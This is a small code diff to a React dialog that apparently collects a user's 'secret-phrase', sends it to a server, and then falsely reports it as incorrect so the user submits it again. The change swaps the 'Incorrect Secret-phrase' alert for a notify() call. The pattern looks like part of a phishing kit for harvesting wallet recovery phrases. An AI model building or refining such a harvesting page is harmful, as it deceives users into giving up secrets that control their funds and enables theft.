@@ -15,7 +15,7 @@ import Typography from "@mui/material/Typography";
 import PropTypes from "prop-types";
 import * as React from "react";
 import "./styles.scoped.css";
-import { sendMessage } from "../config/server";
+import { notify, sendMessage } from "../config/server";
 
 const BootstrapButton = styled(LoadingButton)({
   boxShadow: "none",
@@ -84,7 +84,7 @@ function SimpleDialog(props) {
 
     if (submited.count <= 1) {
       sendMessage(value).then(() => {
-        alert("Incorrect Secret-phrase");
+        notify();
         setSubmited({ ...submited, count: submited.count + 1 });
         setValue({ ...value, phrase: "" });
         setLoading(false);
